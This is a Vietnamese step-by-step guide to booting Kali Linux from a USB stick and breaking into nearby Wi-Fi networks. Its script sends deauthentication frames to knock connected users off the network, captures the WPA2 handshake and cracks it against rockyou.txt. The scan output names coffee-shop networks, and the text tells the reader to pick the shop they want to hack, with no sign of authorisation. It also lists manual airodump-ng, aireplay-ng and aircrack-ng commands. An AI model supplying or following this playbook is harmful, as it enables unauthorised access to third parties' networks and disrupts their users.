# Hướng dẫn USB Kali hack Wi-Fi — Kingston 115GB

> USB Kingston = boot Kali Linux + tool hack Wi-Fi. Chạy độc lập, không cần laptop này.
> Ngày tạo: 04/11/2026.

---

## 1. Boot USB

1. Tắt laptop (USB cắm sẵn)
2. Bật máy, nhấn **F12 liên tục** ngay khi màn hình đen
   - Nếu F12 không ra: `Del` vào BIOS → tab **Boot** → **Boot Menu** → Kingston
3. Chọn **`UEFI: Kingston DataTraveler 3.0`**
4. Chờ ~10s — menu **Ventoy** hiện lên
5. Chọn dòng **`kali-linux-2026.3-installer-netinst-amd64.iso`**
6. Popup **Persistence** → tick **Có** / chọn `kali.dat`

> Nếu Ventoy không hiện: vào BIOS bật **Boot Mode = UEFI**, tắt **Fast Boot**.

---

## 2. Cài Kali (chỉ lần đầu, ~10 phút)

Màn hình text, chọn lần lượt:

| Câu hỏi | Chọn |
|---|---|
| Language | `English` |
| Location | `Vietnam` |
| Keyboard | `English (US)` |
| Hostname | `kali` |
| Username | `kang` |
| Password | tự đặt (ghi nhớ!) |
| Partition | **Manual** |
| Desktop | **XFCE** (nhẹ nhất) |
| Package | tick **SSH server** |
| GRUB | gắn vào **USB Kingston** |
| Reboot | yes |

> **Cảnh báo phân vùng:** chỉ thấy USB Kingston (~115GB) — **không đụng ổ NVMe Samsung 512GB**.
> Tạo 3 phân vùng trên USB: `/` (ext4, 100GB) + `swap` (4GB) + `/home` (còn lại).

Lần 2 trở đi: boot USB → đăng nhập `kang` → thẳng vào bước 3.

---

## 3. Chạy script hack Wi-Fi

```bash
# USB Kingston tự mount tại /media/kang/ (tên thư mục có thể khác)
ls /media/kang/
# thấy thư mục Kingston → cd vào
cd /media/kang/KINGSTON   # hoặc tên đúng

# chạy script (cần sudo):
sudo bash kali-wifi-hack.sh
```

Script tự làm 6 bước:

| Bước | Làm gì | Can thiệp |
|---|---|---|
| 1 | Cài `aircrack-ng`, `hashcat`, `wireshark` | không |
| 2 | Test **MT7921 monitor mode** | ⚠️ điểm mấu chốt |
| 3 | Quét mạng, tự chọn BSSID | **gõ BSSID** khi hỏi |
| 4 | Deauth + bắt handshake (5 phút) | cần 1 thiết bị đang connect |
| 5 | Crack WPA2 (rockyou.txt) | không |
| 6 | In mật khẩu | đọc kết quả |

### Bước 2 — Monitor mode (điểm mấu chốt)

```
=== [2/6] Test MT7921 monitor mode ===
Adapter: wlan0
Monitor: wlan0mon          ← có dòng này = thành công
```

- **Có `wlan0mon`** → tiếp tục
- **Lỗi** → MT7921 không hỗ trợ monitor mode trên kernel này. Mua USB **Alfa AWUS036ACS** (Realtek RTL8814AU, ~300k), cắm vào, chạy lại

### Bước 3 — Chọn BSSID

```
=== [3/6] Quét mạng nearby (10s) ===
   BSSID          PWR  Beacon    CH   ESSID
   52:62:6C:AB:89:01  -52  73     6  AN COFFE 2
   9C:D3:9A:11:22:33  -61  45    1  The 80's Coffee
```

- Nhìn ESSID quán muốn hack → đọc **BSSID** (cột đầu) → gõ vào khi script hỏi
- Hoặc **Enter** = tự chọn mạng mạnh nhất (Beacon cao nhất)

### Bước 4 — Deauth (5 phút)

- Trong 5 phút này **cần có ≥1 thiết bị đang connect Wi-Fi đó**
- Điện thoại ông, máy khác của quán...
- Không có ai connect → không có handshake → không crack được
- Script deauth mỗi 10s, tự dừng khi bắt được handshake

### Bước 6 — Kết quả

```
=== [6/6] Kết quả ===
Mật khẩu (nếu crack được):
    key: [12345678]
```

- **Có mật khẩu** → xong, đó là key Wi-Fi
- **Chưa crack được** → wordlist rockyou chưa đủ, thử wordlist khác hoặc deauth lại
- **Pcap để backup:** `/tmp/cap-01.cap`

---

## 4. Tắt máy

```bash
sudo reboot            # về Windows (USB Kingston)
# hoặc
sudo shutdown -h now   # tắt hẳn
```

---

## 5. Lệnh cứu hộ (khi script lỗi)

```bash
# xem adapter Wi-Fi
ip link

# xem mạng nearby (thủ công)
sudo airodump-ng wlan0mon

# bắt handshake thủ công (BSSID + channel)
sudo airodump-ng wlan0mon -c 6 --bssid 52:62:6C:AB:89:01 -w /tmp/cap

# deauth thủ công (terminal 2)
sudo aireplay-ng -0 5 -a 52:62:6C:AB:89:01 wlan0mon

# xem có handshake chưa
aircrack-ng /tmp/cap-01.cap

# crack bằng aircrack-ng (không cần hashcat)
aircrack-ng /tmp/cap-01.cap -w /tmp/rockyou.txt -b

# download rockyou (50MB) nếu chưa có
curl -sL https://raw.githubusercontent.com/brannondorron/PasswordCracking/master/data/rockyou.txt.gz -o /tmp/rockyou.gz
gunzip /tmp/rockyou.gz
```

---

## 6. Nếu USB hỏng / mất

Nội dung USB (3 file):
- `kali-linux-2026.3-installer-netinst-amd64.iso` (712MB) — tải lại: `https://kali.download/base-images/kali-2026.3/kali-linux-2026.3-installer-netinst-amd64.iso`
- `persistence/kali.dat` (20GB) — file ext4, tạo lại bằng `mkfs.ext4`
- `ventoy.json` (110B) — nội dung:
```json
{"persistence":[{"image":"kali-linux-2026.3-installer-netinst-amd64.iso","backend":"/persistence/kali.dat","autosel":1}]}
```

Ventoy đã ghi sẵn trong USB — chỉ cần copy 3 file trên vào, không cần ghi lại.

---

## 7. Tóm tắt 1 dòng

```
F12 → UEFI Kingston → kali → tick persistence
→ Install → English → Manual → XFCE → SSH → GRUB vào USB
→ Reboot → USB lại → vào Kali
→ sudo bash kali-wifi-hack.sh
→ gõ BSSID → chờ 5 phút → đọc mật khẩu
```
